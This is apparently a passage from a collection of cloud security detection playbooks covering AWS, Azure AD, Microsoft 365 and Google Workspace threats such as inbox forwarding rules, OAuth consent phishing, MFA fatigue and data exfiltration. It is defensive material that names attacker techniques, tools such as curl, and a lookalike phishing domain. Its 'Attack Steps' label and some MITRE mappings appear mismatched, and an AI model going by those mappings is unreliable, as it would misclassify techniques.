- **Detection**: Ownership change log
- **Solution**: Revert + Lock
- **Tags**: #azure #takeover #subscriptionhijack

## AWS Alert on Multiple Key Rotations in Short Time

- **Attack Type**: Credential Management Anomaly
- **Target**: AWS IAM
- **Vulnerability**: Key misuse
- **MITRE**: T1556
- **Impact**: Obfuscation of key usage
- **Tools**: AWS CloudTrail, Security Hub
- **Scenario**: Attacker rotates multiple IAM access keys rapidly to obscure usage
- **Attack Steps**: 1. Monitor UpdateAccessKey or CreateAccessKey events in CloudTrail. 2. Alert when >3 keys are rotated within 10-minute window. 3. Determine if any access keys were used immediately after rotation. 4. Check origin IP and geolocation of requestor. 5. Suspend affected users and investigate prior credential use. 6. Enforce key rotation policies and auto-expiration for temporary keys. 7. Notify IAM management team and generate audit trail. 8. Implement stricter rate limits and alerts on key activities.
- **Detection**: AccessKey event spikes
- **Solution**: Suspend + Rotate + Alert
- **Tags**: #iam #aws #keyabuse

## Azure Detection of Mass Conditional Access Policy Removal

- **Attack Type**: Policy Evasion
- **Target**: Azure AD
- **Vulnerability**: Security control bypass
- **MITRE**: T1562.006
- **Impact**: Loss of access control
- **Tools**: Azure AD Logs, Identity Protection, Sentinel
- **Scenario**: Malicious actor disables conditional access policies to weaken security posture
- **Attack Steps**: 1. Monitor all conditional access changes — especially policy deletions. 2. Alert on multiple policy removals in under 5 minutes. 3. Correlate with login and session data of the actor performing the change. 4. Revert deleted policies from backup or deploy known-good baseline. 5. Suspend identity that made unauthorized changes. 6. Conduct a forensic review of all authentications post-change. 7. Notify compliance and leadership teams of potential breach. 8. Apply change control workflows and RBAC for policy edits.
- **Detection**: CA change log review
- **Solution**: Restore + Suspend
- **Tags**: #azure #policytamper #conditionalaccess

## AWS Alert on S3 Bucket Policy Allowing Full Public Write

- **Attack Type**: Misconfiguration
- **Target**: AWS S3
- **Vulnerability**: Public write access
- **MITRE**: T1530
- **Impact**: Malicious file hosting
- **Tools**: S3 Bucket Policies, AWS Config, CloudTrail
- **Scenario**: An attacker modifies S3 bucket policy to allow s3:PutObject from any principal
- **Attack Steps**: 1. Track changes to bucket policies via PutBucketPolicy events in CloudTrail. 2. Alert on conditions where Principal = * and Action = s3:PutObject. 3. Inspect if attacker is uploading web shells, phishing pages, or malware. 4. Immediately block access via bucket ACL or remove policy. 5. Notify data owners and delete any malicious content. 6. Run AWS Config rule to enforce encryption and ownership restriction. 7. Reconfigure WAF or CloudFront to avoid public caching. 8. Flag bucket for recurring audit.
- **Detection**: Policy pattern alerting
- **Solution**: Revoke + Delete + Monitor
- **Tags**: #s3 #publicwrite #bucketpolicy

## Azure Monitor Alert on Log Retention Policy Decrease

- **Attack Type**: Log Forensics Evasion
- **Target**: Azure
- **Vulnerability**: Log lifecycle tampering
- **MITRE**: T1562.006
- **Impact**: Forensic blindspot
- **Tools**: Azure Monitor Logs, Activity Logs, Sentinel
- **Scenario**: Attacker reduces retention of key log groups to hide activities
- **Attack Steps**: 1. Alert when log retention settings are modified via portal or API. 2. Correlate Set-LogRetentionPolicy or API PATCH calls with actor identity. 3. Investigate purpose and timing — if during active investigation, treat as evasion. 4. Revert retention to 90 days or default org setting. 5. Prevent further change via RBAC policy lock. 6. Check whether logs were exported before deletion. 7. Notify SOC and initiate IR process. 8. Enforce immutable logs via Event Hub or SIEM pipeline.
- **Detection**: Retention config audit
- **Solution**: Revert + Lock + Alert
- **Tags**: #azure #logpolicy #forensicsevasion

## Detection of Malicious Inbox Rule for Auto-forwarding

- **Attack Type**: Mailbox Rule Abuse
- **Target**: Microsoft 365 Mailbox
- **Vulnerability**: Auto-forward abuse
- **MITRE**: T1114.003
- **Impact**: Data exfiltration
- **Tools**: Microsoft 365 Defender, Purview Audit Logs
- **Scenario**: Attacker creates a hidden inbox rule that auto-forwards all mail to external address
- **Attack Steps**: 1. Monitor for New-InboxRule or Set-InboxRule actions via Unified Audit Logs in Purview. 2. Flag any rule that contains forwarding to external email domains, especially free services like Gmail or ProtonMail. 3. Check whether the rule has obfuscated names like "FaxJob" or "PrinterSync" to evade admin notice. 4. Investigate the actor performing the action — cross-check login time, MFA state, and IP location. 5. Review content of recently forwarded emails using Microsoft Purview DLP alerts to detect sensitive content exfiltration. 6. Disable the rule immediately and notify the affected user and SOC. 7. Use Defender for Office 365 to trace if this action was part of a larger phishing campaign. 8. Implement policy to block creation of auto-forward rules to external domains.
- **Detection**: Audit logs + rule patterns
- **Solution**: Disable + Block Policy
- **Tags**: #o365 #forwardingrule #emailsecurity

## Alert on Suspicious Google Workspace OAuth Grant

- **Attack Type**: App Abuse
- **Target**: Google Workspace
- **Vulnerability**: OAuth access hijack
- **MITRE**: T1550.001
- **Impact**: Persistent access
- **Tools**: Google Workspace Admin Console, Chronicle, SIEM
- **Scenario**: Rogue third-party app gains OAuth access to Gmail, Drive, or Calendar
- **Attack Steps**: 1. Enable OAuth Token Audit logging in Google Workspace and log app consent events. 2. Alert when a user authorizes a third-party app that requests full Gmail or Drive scope (e.g., https://mail.google.com/). 3. Correlate app metadata with threat intelligence feeds (e.g., ThreatFox, MISP) for known malicious client IDs. 4. Flag apps that request excessive permissions but have low trust ratings or were never used before. 5. Suspend OAuth token issuance temporarily if app appears suspicious. 6. Notify the user and security team, and recommend immediate token revocation. 7. Use BeyondCorp policies to prevent future risky OAuth app grants. 8. Conduct a retrospective search of the app’s activity across all accounts.
- **Detection**: OAuth token audit
- **Solution**: Revoke + Block App
- **Tags**: #gsuite #oauth #rogueapps

## Detect MFA Bypass Attempt via Legacy Authentication

- **Attack Type**: MFA Weakness
- **Target**: O365
- **Vulnerability**: MFA bypass via protocol
- **MITRE**: T1110.003
- **Impact**: Account compromise
- **Tools**: M365 Sign-In Logs, Azure Conditional Access
- **Scenario**: Attacker gains access through IMAP/SMTP bypassing modern MFA
- **Attack Steps**: 1. Monitor all sign-ins flagged as Legacy Authentication in Azure AD logs. 2. Cross-check user accounts that logged in without MFA even when MFA policy is applied. 3. Identify the client type (e.g., Thunderbird, Outlook 2010) and IP location. 4. Flag high-value users such as executives or admins accessing via legacy clients. 5. Alert if the account was used to send emails shortly after such login. 6. Enforce Authentication Policy to block IMAP/POP for all users unless required. 7. Notify user, revoke session, and require password reset. 8. Audit mailbox for suspicious rules or sent messages.
- **Detection**: Auth method logging
- **Solution**: Block legacy protocols
- **Tags**: #mfa #legacyauth #m365

## Alert on Excessive File Downloads from Google Drive

- **Attack Type**: Insider Threat
- **Target**: Google Workspace
- **Vulnerability**: Data theft (Insider)
- **MITRE**: T1537
- **Impact**: Mass data access
- **Tools**: Google Drive Audit Logs, Chronicle SIEM
- **Scenario**: User downloads gigabytes of files in short time, indicating data theft
- **Attack Steps**: 1. Log and monitor all download events via Google Workspace Drive audit logs. 2. Set thresholds for data exfil — e.g., more than 500MB in under 10 minutes. 3. Correlate download activity with user behavior and device location — flag access from personal devices or IPs outside enterprise geofence. 4. Alert when file types include spreadsheets, business docs, or proprietary data. 5. Revoke account or Drive access if activity is verified as anomalous. 6. Use Chronicle to backtrack login, OAuth, and device history of the user. 7. Notify insider risk team and initiate full forensic triage. 8. Use DLP rules to restrict future large-scale downloads.
- **Detection**: Download spikes + file type
- **Solution**: Disable + DLP lock
- **Tags**: #googledrive #insiderthreat #exfil

## Office 365 Detection of Phishing Payload Upload in OneDrive

- **Attack Type**: Payload Hosting
- **Target**: Microsoft OneDrive
- **Vulnerability**: File payload abuse
- **MITRE**: T1105
- **Impact**: Malware distribution
- **Tools**: M365 Defender, SharePoint Logs, Defender for Endpoint
- **Scenario**: Attacker uploads HTML or EXE payload in user OneDrive to share externally
- **Attack Steps**: 1. Monitor file uploads to OneDrive with suspicious extensions (.exe, .hta, .html). 2. Alert if such files are shared externally via anonymous or public links. 3. Correlate upload activity with recent phishing email activity using Defender for Office 365. 4. Use Defender AV scan results to classify payloads or link to malware families. 5. Block download link and remove shared access. 6. Quarantine file and alert user to reset password. 7. Investigate if payload was part of known malware campaign (e.g., Emotet dropper). 8. Configure sharing policy to block anonymous link sharing by default.
- **Detection**: File extension + share type
- **Solution**: Block + Quarantine
- **Tags**: #onedrive #payload #malwarehost

## Alert on Sudden Increase in External Sharing

- **Attack Type**: Abnormal Sharing
- **Target**: Microsoft 365
- **Vulnerability**: Excessive external sharing
- **MITRE**: T1537
- **Impact**: Sensitive data exposure
- **Tools**: M365 Audit Logs, SharePoint Online, DLP Rules
- **Scenario**: User suddenly shares large number of docs with external parties
- **Attack Steps**: 1. Set baseline on each user's external sharing frequency via M365 audit logs. 2. Alert when the number of shared documents crosses this baseline by >5x in 24h. 3. Analyze file sensitivity — label as HR, Legal, Finance, etc., via Microsoft Information Protection. 4. Block or revoke access to files shared externally without business justification. 5. Notify the manager and security team. 6. Perform retroactive analysis on all external users who accessed these files. 7. Use Conditional Access to apply session controls for future sharing attempts. 8. Log incident for insider threat review.
- **Detection**: Share spike alerting
- **Solution**: Revoke + Notify
- **Tags**: #o365 #dlp #externalsharing

## Google Workspace: Alert on Multiple Concurrent Logins

- **Attack Type**: Account Abuse
- **Target**: Google Workspace
- **Vulnerability**: Session hijack / sharing
- **MITRE**: T1078
- **Impact**: Credential theft or sharing
- **Tools**: Google Admin Console, Security Investigation Tool
- **Scenario**: Multiple logins from different regions within minutes indicate account sharing or compromise
- **Attack Steps**: 1. Enable login geo-tracking using Google’s Security Center. 2. Alert when same user logs in from two or more countries within 15-minute window. 3. Compare device fingerprints and browser headers for consistency. 4. Correlate with known proxy/VPN service IPs. 5. Flag such logins from privileged users or sensitive departments. 6. Suspend account temporarily and request revalidation via MFA. 7. Notify user’s manager and investigate credential reuse. 8. Require password rotation and reinforce security training.
- **Detection**: Geo-IP correlation
- **Solution**: Suspend + Notify
- **Tags**: #geologin #gsuite #compromise

## Alert on Repeated MFA Challenges in Short Span

- **Attack Type**: Brute-force / Spray
- **Target**: Microsoft 365
- **Vulnerability**: MFA abuse attempt
- **MITRE**: T1110.003
- **Impact**: Auth fatigue / brute-force
- **Tools**: Azure AD Identity Protection, Sentinel
- **Scenario**: MFA prompts repeatedly triggered without user interaction
- **Attack Steps**: 1. Enable logging for MFA Challenge failures and successes. 2. Alert when more than 5 MFA prompts are triggered within 2–3 minutes. 3. Correlate IP and user agent — flag use of automation tools. 4. Cross-check if user ever accepted any challenge — if not, classify as forced brute. 5. Block source IPs using Conditional Access or Firewall. 6. Temporarily lock account for additional scrutiny. 7. Notify user and recommend password reset and device security check. 8. Add IP to high-risk watchlist for threat intelligence correlation.
- **Detection**: MFA failure clustering
- **Solution**: IP block + Notify
- **Tags**: #mfaabuse #azure #fatigueattack

## Detect Unusual Admin Consent Grant to Enterprise App

- **Attack Type**: Application Hijack
- **Target**: Azure AD
- **Vulnerability**: Admin app abuse
- **MITRE**: T1550.001
- **Impact**: Privilege escalation
- **Tools**: Azure Enterprise Apps, Admin Consent Workflow, Audit Logs
- **Scenario**: Admin consents to app that gains org-wide access to user data
- **Attack Steps**: 1. Monitor AdminConsentGranted events and log affected application scopes. 2. Alert when the app is newly registered and requests broad permissions (e.g., Mail.ReadWrite.All, User.Read.All). 3. Cross-reference with app publisher domain and registration time. 4. Check if app was consented to via phishing redirection or fake SSO prompt. 5. Immediately disable consented app in Azure portal. 6. Alert all users who may have been affected and recommend password rotation. 7. Block future org-wide app consents unless reviewed by SecOps. 8. Use Defender for Cloud Apps to restrict risky OAuth behavior.
- **Detection**: Consent event audit
- **Solution**: Disable + Alert + Review
- **Tags**: #azuread #adminconsent #oauth

## Alert on Unusual Calendar Event Creation with Phishing Link

- **Attack Type**: Calendar Phishing
- **Target**: Google Calendar
- **Vulnerability**: Phishing via invites
- **MITRE**: T1566.002
- **Impact**: User interaction trap
- **Tools**: Google Calendar Logs, Gmail Investigation Tool
- **Scenario**: Attacker injects phishing link via calendar invite across org
- **Attack Steps**: 1. Enable Calendar logging for invite creation events with external senders. 2. Alert on event bodies containing URLs that match phishing indicators or newly registered domains. 3. Cross-reference invite subject lines with known spam campaigns (e.g., "Job Opportunity" or "Claim Prize"). 4. Notify all recipients with warning banner or quarantine event. 5. Block sender address in Gmail and revoke calendar invite permissions. 6. Scan any attachments with VirusTotal API or sandboxing tool. 7. Educate users about calendar phishing as emerging threat. 8. Apply policies to restrict external calendar invites to whitelist domains.
- **Detection**: URL + event scan
- **Solution**: Quarantine + Block
- **Tags**: #calendarphishing #google #phishing

## Detect Office 365 User Consent Phishing via Malicious OAuth

- **Attack Type**: Credential Theft via OAuth
- **Target**: Office 365
- **Vulnerability**: Phishing + OAuth abuse
- **MITRE**: T1556.003
- **Impact**: Account compromise
- **Tools**: Defender for Cloud Apps, Azure Audit Logs, Microsoft Graph
- **Scenario**: User tricked into consenting to malicious app requesting access to mail or files
- **Attack Steps**: 1. Monitor for Consent to App logs where the app is newly registered and lacks verified publisher status. 2. Identify when the application requests sensitive scopes such as Mail.Read, Files.ReadWrite.All, or offline_access. 3. Correlate the consent event with time of delivery of suspicious emails containing "Click here to authorize" links. 4. Check if the URL uses open redirect abuse or URL shorteners. 5. Notify the user and immediately revoke access token from the consented app using Graph API. 6. Block future OAuth app consents using Conditional Access policies. 7. Create an allowlist of trusted applications and enforce admin review for future grants. 8. Perform retroactive investigation into all actions made by the OAuth app in user's account.
- **Detection**: Consent event + app metadata
- **Solution**: Revoke + Restrict Policy
- **Tags**: #oauthphishing #m365 #defender

## Alert on Gmail Filter Rules that Auto-Archive or Delete Messages

- **Attack Type**: Email Rule Abuse
- **Target**: Gmail (GWS)
- **Vulnerability**: Stealth via filters
- **MITRE**: T1114.003
- **Impact**: Alert suppression
- **Tools**: Gmail Audit API, Google Admin SDK
- **Scenario**: Attacker configures Gmail filters to delete security alerts silently
- **Attack Steps**: 1. Continuously monitor Gmail settings for any creation of rules that delete or archive inbound emails. 2. Alert if rule keywords match phrases like "security alert", "login verification", or "unusual sign-in". 3. Flag such rules especially if created immediately after suspicious login activity or MFA reset. 4. Cross-check actor's IP address and browser user-agent for anomalies. 5. Immediately disable the rule and restore any deleted emails from trash. 6. Notify SOC and affected user to reset credentials. 7. Implement policy to restrict rule creation to approved keywords. 8. Document the event for insider threat analysis or APT indicators.
- **Detection**: Filter settings monitoring
- **Solution**: Rule disable + Audit
- **Tags**: #gmail #filterabuse #stealthattack

## Detection of Suspicious Mailbox Delegation in Office 365

- **Attack Type**: Privilege Misuse
- **Target**: Microsoft 365 Mailbox
- **Vulnerability**: Stealth persistence
- **MITRE**: T1098.002
- **Impact**: Hidden access
- **Tools**: M365 Defender, Graph API, Unified Audit Logs
- **Scenario**: Adversary assigns mailbox access to another user to maintain persistence
- **Attack Steps**: 1. Monitor Add-MailboxPermission and Set-MailboxPermission events from Audit logs. 2. Flag permission grants where the grantee is an unrelated or external user, or action was not approved. 3. Alert when SendAs, FullAccess, or ReadPermission is granted outside business hours. 4. Review prior login activity of both delegator and delegate to confirm compromise. 5. Revoke permissions and remove delegate account if identified as malicious. 6. Notify the mailbox owner and enforce MFA if not enabled. 7. Create automation to revert unauthorized permission changes. 8. Track all mail forwarding or deletion events that may have used delegate access.
- **Detection**: Permission audit
- **Solution**: Revoke + Alert + Notify
- **Tags**: #mailboxdelegation #o365 #accessabuse

## Alert on Unusual User-Agent Strings in Google Workspace Login

- **Attack Type**: Anomaly Detection
- **Target**: Google Workspace
- **Vulnerability**: Custom tool login
- **MITRE**: T1078
- **Impact**: Bot or script-based intrusion
- **Tools**: Google Admin Reports API, Chronicle
- **Scenario**: Attacker uses custom tools or scripts to log in, evading normal client detection
- **Attack Steps**: 1. Capture all login attempts and extract User-Agent strings from logs. 2. Alert when login attempts originate from script-based UAs like python-requests, curl, PowerShell, or empty fields. 3. Correlate with accounts exhibiting high-risk activity like MFA failures or file sharing spikes. 4. Flag accounts logging in from new IP and strange UA within short time window. 5. Block IP via firewall or identity provider. 6. Temporarily suspend the account and require identity validation. 7. Use security keys or device-based login enforcement for high-risk users. 8. Train users and admins on identifying OAuth scams and malicious login flows.
- **Detection**: UA string + IP pattern
- **Solution**: Block + Suspend
- **Tags**: #uaanomaly #gsuite #customclient

## Detection of Excessive Email Send Rate via Gmail API

- **Attack Type**: Email Abuse
- **Target**: Gmail
- **Vulnerability**: Phishing via API
- **MITRE**: T1585.002
- **Impact**: Spam/phishing delivery
- **Tools**: Gmail API Logs, Google Workspace SIEM
- **Scenario**: Compromised account sends hundreds of phishing messages through Gmail API
- **Attack Steps**: 1. Monitor send events in Gmail API logs — flag accounts sending >100 emails in <10 minutes. 2. Validate message recipients — if >70% are outside organization, raise severity. 3. Scan messages for phishing keywords, shortened URLs, or spoofed links. 4. Immediately suspend token-based access to Gmail API. 5. Notify IT and instruct user to change password + revoke tokens. 6. Quarantine outbound emails and review delivery status. 7. Disable SMTP relay or API access temporarily. 8. Conduct domain reputation check and restore trust with email filtering providers.
- **Detection**: API usage spike
- **Solution**: Quarantine + Suspend
- **Tags**: #gmailapi #spam #bulkemail

## Alert on Token Persistence Using Refresh Tokens

- **Attack Type**: Long-Term Access Abuse
- **Target**: Azure / O365
- **Vulnerability**: Persistent session token
- **MITRE**: T1078.004
- **Impact**: Undetected long-term access
- **Tools**: Azure AD, Defender for Identity, Conditional Access
- **Scenario**: Attacker retains access using refresh token even after user logs out
- **Attack Steps**: 1. Enable sign-in risk detection and monitor refresh token usage across devices. 2. Alert if refresh token is reused from multiple locations or over extended time with no re-auth. 3. Correlate with device ID to detect cloning or token theft. 4. Flag refresh tokens with 90+ day validity and no revalidation events. 5. Revoke token immediately and force sign-out across all sessions. 6. Notify user to change password and enable security defaults. 7. Rotate app secrets and client IDs where abuse occurred. 8. Enforce token expiration and revalidation every 24h via policy.
- **Detection**: Token audit + geo/IP diff
- **Solution**: Token revoke + Notify
- **Tags**: #azuread #refreshtoken #sessionabuse

## Google Workspace Alert on Suspicious Calendar Invite Attachments

- **Attack Type**: Delivery Vector
- **Target**: Google Calendar
- **Vulnerability**: Delivery via event
- **MITRE**: T1566.001
- **Impact**: Malware/phishing via invite
- **Tools**: Google Calendar API, Security Investigation Tool
- **Scenario**: Attacker embeds malicious links or scripts in calendar event attachments
- **Attack Steps**: 1. Enable scan of calendar invites and flag attachments with macros, scripts, or embedded links. 2. Alert when calendar events are created by unverified external users. 3. Quarantine attachments and disable event notifications temporarily. 4. Correlate sender address with known spam lists or blacklisted domains. 5. Scan links using VirusTotal and Sandbox environments. 6. Remove infected events and notify affected invitees. 7. Block repeat offenders via mail flow rules. 8. Apply policy to disallow attachments in external calendar invites.
- **Detection**: Attachment + sender audit
- **Solution**: Quarantine + Block
- **Tags**: #calendar #malwaredelivery #inviteabuse

## Alert on O365 Login from Impossible Travel Locations

- **Attack Type**: Geo-based Anomaly
- **Target**: O365
- **Vulnerability**: Impossible login travel
- **MITRE**: T1078
- **Impact**: Session hijack / VPN abuse
- **Tools**: Azure AD Identity Protection, Sign-in Logs
- **Scenario**: Logins occur from locations impossible to travel between in given time
- **Attack Steps**: 1. Enable Impossible Travel detection in Azure AD Identity Protection. 2. Alert when user logs in from geographically distant locations within short timeframe. 3. Cross-reference IPs, ISP, device ID, and time zone. 4. Flag if session cookie is reused between locations, indicating session hijack. 5. Revoke session and require password reset. 6. Notify user and trigger additional verification via MFA. 7. Block IPs if found to be part of VPN or anonymizer services. 8. Enforce login from compliant or corporate devices only.
- **Detection**: Geo-IP + session reuse
- **Solution**: Revoke + Notify
- **Tags**: #impossibletravel #aad #geoanomaly

## Detect Removal of Anti-Phishing Rules in Exchange Online

- **Attack Type**: Defense Evasion
- **Target**: Exchange Online
- **Vulnerability**: Policy tampering
- **MITRE**: T1562.006
- **Impact**: Degraded security posture
- **Tools**: Exchange Admin Center, Unified Audit Logs
- **Scenario**: Attacker deletes transport rules used to detect phishing or spoofing
- **Attack Steps**: 1. Monitor for Remove-TransportRule or Set-TransportRule events. 2. Alert when anti-phishing, anti-spoofing, or domain blocking rules are removed. 3. Correlate with spike in inbound suspicious emails or spoof attempts. 4. Reapply deleted rules from known baseline. 5. Suspend account that deleted rule if unauthorized. 6. Notify security team and document changes. 7. Use role-based access control to prevent such deletion by general admins. 8. Automate rule integrity check every 24 hours.
- **Detection**: Transport rule audit
- **Solution**: Restore + Restrict
- **Tags**: #o365 #phishingrules #defenseevasion

## Alert on Use of Multiple Browser Profiles to Access Same Account

- **Attack Type**: Stealth Access
- **Target**: Google Workspace
- **Vulnerability**: Multi-device stealth
- **MITRE**: T1078.003
- **Impact**: Shared or hijacked session
- **Tools**: Google Workspace Security Center, Browser Fingerprinting Tools
- **Scenario**: Attacker or insider uses multiple browser profiles/devices to evade detection
- **Attack Steps**: 1. Collect login metadata including device ID, browser version, and OS fingerprint. 2. Alert when same account logs in from more than 3 distinct browser fingerprints in < 1 hour. 3. Flag usage of incognito mode or cookie-less sessions. 4. Correlate with access to sensitive files or admin consoles. 5. Temporarily suspend account and alert SOC. 6. Notify user to confirm legitimate multi-device use. 7. Use session control policies to restrict session reuse. 8. Educate users on secure session behavior and account hygiene.
- **Detection**: Browser fingerprint
- **Solution**: Suspend + Educate
- **Tags**: #browserprofile #gsuite #stealthaccess

## Detection of MFA Method Reset via Social Engineering

- **Attack Type**: MFA Weakness Abuse
- **Target**: O365
- **Vulnerability**: MFA Reset Hijack
- **MITRE**: T1078.002
- **Impact**: Credential persistence
- **Tools**: Azure AD, Identity Protection Logs, Conditional Access
- **Scenario**: Attacker convinces support or uses self-service to reset MFA method
- **Attack Steps**: 1. Monitor for Reset Strong Authentication Method events in Azure AD audit logs. 2. Flag such events where no recent password reset or login anomaly is logged for the same account. 3. Correlate the reset request timestamp with support tickets or helpdesk calls to identify social engineering attempts. 4. Track geolocation of the login post-MFA reset; flag mismatches with historical locations. 5. Immediately challenge the user for step-up authentication or verify via a phone callback. 6. If verified as unauthorized, disable account and conduct credential reset. 7. Alert security admin and flag the user for increased monitoring. 8. Implement approval workflows for MFA resets involving helpdesk agents.
- **Detection**: Audit + Geo + Ticket correlation
- **Solution**: Suspend + Re-auth + Training
- **Tags**: #mfareset #aad #socialengineering

## Alert on Abnormal Sharing Link Creation for Sensitive Folders

- **Attack Type**: Data Leakage
- **Target**: M365 / GWS
- **Vulnerability**: Unauthorized sharing
- **MITRE**: T1537
- **Impact**: Exposed sensitive content
- **Tools**: DLP System, SharePoint Logs, Google Drive Alerts
- **Scenario**: Sensitive HR/Finance folders shared via public link in OneDrive or Google Drive
- **Attack Steps**: 1. Continuously track new CreateLink or Share events in file storage systems. 2. Cross-check folder sensitivity using Microsoft Information Protection or Drive DLP tags. 3. Alert if shared via "Anyone with the link" or to personal Gmail/Yahoo accounts. 4. Evaluate behavior context — sudden link creation after off-hours access or VPN login may be flagged. 5. Revoke shared link immediately and log all external accesses. 6. Notify document owners and SOC team. 7. Apply label-based policies to block external link sharing on sensitive content. 8. Educate data owners on proper sharing practices and periodic permission review.
- **Detection**: Sharing mode + context
- **Solution**: Revoke + Lockdown + Educate
- **Tags**: #dlp #sensitivefiles #exfiltration

## Detection of Malicious Reply-To Manipulation in O365 Emails

- **Attack Type**: Phishing Trick
- **Target**: O365 Mail
- **Vulnerability**: Email Header Abuse
- **MITRE**: T1566.002
- **Impact**: Phishing/BEC
- **Tools**: Exchange Online, Defender for Office 365
- **Scenario**: Attacker spoofs internal user but alters Reply-To to external address
- **Attack Steps**: 1. Parse incoming email headers for Reply-To field mismatch compared to From: domain. 2. Alert if Reply-To points to external domain while sender appears internal. 3. Cross-check sender reputation and SPF/DKIM alignment. 4. Check if similar emails were received by multiple internal users in a campaign-style. 5. Quarantine such emails and alert users about the phishing attempt. 6. Block sender domain and report to Threat Intel platform. 7. Analyze click behavior to detect if users interacted with malicious links. 8. Deploy warning banners for mismatched headers and anomalous mail flows.
- **Detection**: Header logic + domain validation
- **Solution**: Quarantine + Block
- **Tags**: #emailspoofing #replyto #phishing

## Alert on External OAuth App Re-consented Across Users

- **Attack Type**: App Abuse Pattern
- **Target**: O365 / Azure
- **Vulnerability**: OAuth abuse scaling
- **MITRE**: T1550.001
- **Impact**: Persistent access spread
- **Tools**: Microsoft Cloud App Security, Admin Audit Logs
- **Scenario**: A malicious OAuth app gets consented across multiple org users
- **Attack Steps**: 1. Log all OAuth consent events across users in the organization. 2. Alert when the same external app (client ID) is authorized by >3 users in <24 hours. 3. Check app publisher domain — if unverified or suspicious, raise severity. 4. Compare requested scopes — if same broad permissions seen across grants, treat as coordinated attack. 5. Revoke consent for all users and blacklist app ID in Cloud App Security. 6. Notify impacted users and enforce MFA re-authentication. 7. Set conditional access policy to block unverified apps. 8. Submit the client ID to threat feed (ThreatFox, VirusTotal).
- **Detection**: Consent clustering
- **Solution**: Revoke + Block + Alert
- **Tags**: #oauthattack #o365 #cloudabuse

## Monitor for Downloads of Password-Protected Archives

- **Attack Type**: Stealth Exfiltration
- **Target**: M365 / Defender
- **Vulnerability**: Data exfil via archive
- **MITRE**: T1020
- **Impact**: DLP evasion
- **Tools**: Microsoft Defender for Endpoint, Cloud DLP
- **Scenario**: Attacker downloads .zip or .rar files with password protection to evade DLP
- **Attack Steps**: 1. Monitor for file downloads involving .zip, .rar, or .7z extensions from shared or synced folders. 2. Alert if file entropy or scanning reveals strong encryption. 3. Check user behavior — if multiple such files downloaded in short time, flag as exfiltration attempt. 4. Compare file names with sensitive labels or known project codes. 5. Trigger DLP scan bypass alert if encryption detected. 6. Suspend sync access temporarily and initiate security review. 7. Notify compliance and data governance teams. 8. Block creation or download of password-protected archives using endpoint DLP policies.
- **Detection**: File type + scan bypass
- **Solution**: Block + Investigate
- **Tags**: #archiveexfil #dlpbypass #zipfiles

## Detect Suspicious OAuth Redirect URI Misuse

- **Attack Type**: OAuth Redirection Attack
- **Target**: Azure / O365
- **Vulnerability**: OAuth redirect attack
- **MITRE**: T1606.002
- **Impact**: Credential capture
- **Tools**: Azure Portal, App Registrations, Defender for Cloud Apps
- **Scenario**: Attacker registers malicious app with legitimate-looking redirect URI
- **Attack Steps**: 1. Review all app registrations and extract redirect_uri values. 2. Alert when URIs resemble trusted brands but host unknown domains (e.g., https://login-microsoft-verify.com). 3. Monitor token requests that complete on such domains. 4. Block client ID and remove from tenant. 5. Notify security team and alert affected users to rotate passwords. 6. Log and hunt for similar patterns in tenant-wide audit logs. 7. Apply conditional access to restrict token issuance to verified redirect URIs. 8. Educate developers on secure OAuth app registration practices.
- **Detection**: Redirect URI audit
- **Solution**: Block + Alert
- **Tags**: #oauthmisuse #redirecturi #appsecurity

## Alert on Sudden Surge of Calendar Sharing Invites

- **Attack Type**: Social Engineering
- **Target**: Google Workspace
- **Vulnerability**: Calendar phish delivery
- **MITRE**: T1566.001
- **Impact**: Phishing via event flood
- **Tools**: Google Workspace Admin, Calendar Logs
- **Scenario**: Mass calendar invites sent with embedded phishing or scam links
- **Attack Steps**: 1. Track volume of calendar events created per user per hour. 2. Alert when user creates >50 events with external attendees in short time. 3. Parse event body — if matching phishing patterns or scam templates, escalate. 4. Notify security admin and block sender. 5. Quarantine events and disable invite delivery. 6. Investigate login behavior of user for compromise. 7. Review all past calendar events for malicious patterns. 8. Disable external calendar event creation temporarily.
- **Detection**: Invite count + body scan
- **Solution**: Block + Quarantine
- **Tags**: #calendarabuse #invitephishing

## Detection of Conditional Access Policy Misconfiguration

- **Attack Type**: Misconfigured Security
- **Target**: Azure AD
- **Vulnerability**: Misconfig detection
- **MITRE**: T1562.001
- **Impact**: Policy bypass
- **Tools**: Azure AD Conditional Access, Defender for Cloud Apps
- **Scenario**: Critical users allowed access from high-risk IPs due to faulty rules
- **Attack Steps**: 1. Review conditional access policies for gaps like "Allow All IPs" or "All Countries" rules. 2. Alert if high-privilege users (Global Admins, HR, Finance) are assigned such policies. 3. Detect sign-ins from blacklisted IPs or anonymizers allowed via these policies. 4. Simulate attack paths using policy testing in Azure AD portal. 5. Immediately disable or correct policy assignment. 6. Notify IT admins and security heads. 7. Implement granular policies by role and geo-location. 8. Review conditional access policies weekly for drift.
- **Detection**: Policy + sign-in match
- **Solution**: Fix + Notify
- **Tags**: #conditionalaccess #misconfig #policyflaw

## Detect Credential Stuffing via OAuth Consent Reuse

- **Attack Type**: API Abuse
- **Target**: Azure / Graph API
- **Vulnerability**: Token reuse across tenants
- **MITRE**: T1550.003
- **Impact**: Credential reuse
- **Tools**: Microsoft Graph, OAuth Logs, Defender for Cloud Apps
- **Scenario**: Attacker reuses stolen consent tokens across multiple tenants
- **Attack Steps**: 1. Monitor token usage logs and detect client IDs used across different tenants. 2. Flag reuse of access tokens from abnormal locations. 3. Alert on identical consent patterns seen across multiple orgs. 4. Correlate with recent credential leaks or token theft campaigns. 5. Immediately revoke token and disable app. 6. Report abuse to Microsoft Security Response Center. 7. Block application at API gateway level. 8. Monitor for ongoing token misuse using behavior analytics.
- **Detection**: Tenant-wide token analysis
- **Solution**: Revoke + Block
- **Tags**: #oauthstuffing #tokenreuse #apiabuse

## Monitor Drive or SharePoint File Renames for Exfil Obfuscation

- **Attack Type**: Obfuscation Technique
- **Target**: M365 / GWS
- **Vulnerability**: File name obfuscation
- **MITRE**: T1020.001
- **Impact**: DLP evasion
- **Tools**: Google Drive Logs, Microsoft SharePoint Audit
- **Scenario**: User renames sensitive files before downloading to avoid DLP triggers
- **Attack Steps**: 1. Monitor rename events where a file changes from .xlsx, .docx to .pdf, .txt, .img, or random strings. 2. Alert when rename is followed by download within 5 minutes. 3. Check file path or tags to validate sensitivity. 4. Correlate with large download activity or suspicious IPs. 5. Lock access temporarily and alert user. 6. Notify compliance and infosec teams. 7. Educate employees on acceptable handling of sensitive files. 8. Automate blocking of rename-download chains for protected files.
- **Detection**: Rename + download chain
- **Solution**: Lockdown + Alert
- **Tags**: #obfuscation #dataloss #dlp

## Detection of Unauthorized kubectl exec Into a Running Pod

